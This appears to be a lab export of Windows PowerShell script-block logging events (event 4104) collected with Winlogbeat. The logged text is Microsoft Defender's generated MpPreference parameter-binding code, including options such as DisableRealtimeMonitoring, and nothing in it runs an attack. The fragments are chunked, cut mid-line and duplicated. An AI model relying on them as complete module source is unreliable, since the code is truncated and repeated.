          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureBlobUpdateInterval')) {
          [object]$__cmdletization_value = ${SignatureBlobUpdateInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureBlobFileSharesSources')) {
          [object]$__cmdletization_value = ${SignatureBlobFileSharesSources}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {
          [object]$__cmdletization_value = ${ScanScheduleQuickScanTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {
          [object]$__cmdletization_value = ${ScanScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ThrottleForScheduledScanOnly')) {
          [object]$__cmdletization_value = ${ThrottleForScheduledScanOnly}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureFirstAuGracePeriod')) {
          [object]$__cmdletization_value = ${SignatureFirstAuGracePeriod}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {
          [object]$__cmdletization_value = ${SignatureAuGracePeriod}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {
          [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {
          [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {
          [object]$__cmdletization_value = ${SignatureFallbackOrder}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {
          [object]$__cmdletization_value = ${SharedSignaturesPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {
          [object]$__cmdletization_value = ${SignatureScheduleDay}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {
          [object]$__cmdletization_value = ${SignatureScheduleTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {
          [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {
          [object]$__cmdletization_value = ${SignatureUpdateInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureBlobUpdateInterval')) {
          [object]$__cmdletization_value = ${SignatureBlobUpdateInterval}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SignatureBlobFileSharesSources')) {
          [object]$__cmdletization_value = ${SignatureBlobFileSharesSources}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft",4,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3333,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",Y3kSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.203",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (5 of 20):
.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MeteredConnectionUpdates')) {
          [object]$__cmdletization_value = ${MeteredConnectionUpdates}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionOnWinServer')) {
          [object]$__cmdletization_value = ${AllowNetworkProtectionOnWinServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDatagramProcessing')) {
          [object]$__cmdletization_value = ${DisableDatagramProcessing}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableCpuThrottleOnIdleScans')) {
          [object]$__cmdletization_value = ${DisableCpuThrottleOnIdleScans}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MAPSReporting')) {
          [object]$__cmdletization_value = ${MAPSReporting}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {
          [object]$__cmdletization_value = ${SubmitSamplesConsent}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableAutoExclusions')) {
          [object]$__cmdletization_value = ${DisableAutoExclusions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisablePrivacyMode')) {
          [object]$__cmdletization_value = ${DisablePrivacyMode}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {
          [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SchedulerRandomizationTime')) {
          [object]$__cmdletization_value = ${SchedulerRandomizationTime}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {
          [object]$__cmdletization_value = ${DisableBehaviorMonitoring}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {
          [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {
          [object]$__cmdletization_value = ${DisableIOAVProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {
          [object]$__cmdletization_value = ${DisableRealtimeMonitoring}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {
          [object]$__cmdletization_value = ${DisableScriptScanning}
          $__cmdle

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc",".PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MeteredConnectionUpdates')) {
          [object]$__cmdletization_value = ${MeteredConnectionUpdates}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionOnWinServer')) {
          [object]$__cmdletization_value = ${AllowNetworkProtectionOnWinServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableDatagramProcessing')) {
          [object]$__cmdletization_value = ${DisableDatagramProcessing}
